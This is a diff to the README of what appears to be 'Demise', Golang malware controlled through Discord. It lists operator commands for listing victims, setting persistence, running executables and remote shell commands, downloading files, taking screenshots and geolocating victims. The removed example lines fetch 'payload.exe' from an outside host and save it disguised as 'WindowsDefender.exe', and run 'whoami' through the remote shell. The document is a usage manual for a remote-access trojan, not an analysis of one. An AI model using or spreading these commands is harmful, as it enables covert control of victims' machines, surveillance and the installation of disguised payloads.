@@ -9,87 +9,35 @@ Demise is Golang malware that uses Discord for communication.
 ![image](https://user-images.githubusercontent.com/99378532/184524374-a18668bc-7888-4912-b4be-269bedde7b6e.png)
 
 # Commands
+- show victims connected
+```$victims```
 
-show victims connected
+- extract a zip file
+```$unzip <username> <.zip file on drive> <directory to extract in>```
 
-$victims
+- run Demise on startup
+```$startup <username>```
 
+- run an executable (some executables require admin)
+```$run <username> <location of exe>```
 
-extract a zip file
+- download file
+```$dl <username> <url> <name of file>```
 
-$unzip <username> <.zip file on drive> <directory to extract in>
+- run commands
+```$shell <username> <command> <flags... optional>```
 
-Example:
+- screenshot desktop
+```$ss <username>```
 
-$unzip DESKTOP-2HJUUK6\Tod main.zip C:\msys64\home\Tod\projects\go\src\github.com\0xSegFaulted\
+- get IP
+```$ip <username>```
 
+- kill session
+```$kill <username>```
 
-run Demise on startup
-
-$startup <username>
-
-Example
-
-$startup DESKTOP-2HJUUK6\Tod
-
-
-run an executable (some executables require admin)
-
-$run <username> <location of exe>
-
-Example
-
-$run DESKTOP-2HJUUK6\Tod file.exe
-
-
-download file
-
-$dl <username> <url> <name of file>
-
-Example
-
-$dl DESKTOP-2HJUUK6\Tod http://somesite.com/payload.exe WindowsDefender.exe
-
-
-run commands
-
-$shell <username> <command> <flags... optional>
-
-Example 
-
-$shell DESKTOP-2HJUUK6\Tod whoami
-
-
-screenshot desktop
-
-$ss <username>
-
-Example
-
-$ss DESKTOP-2HJUUK6\Tod
-
-
-get IP
-
-$ip <username>
-
-Example
-
-$ip DESKTOP-2HJUUK6\Tod
-
-
-kill session
-
-$kill <username>
-
-$kill DESKTOP-2HJUUK6\Tod
-
-
-geolocate
-
-$geoloc <username>
-
-$geoloc DESKTOP-2HJUUK6\Tod
+- geolocate
+```$geoloc <username>```
 
 
 # HOWTO
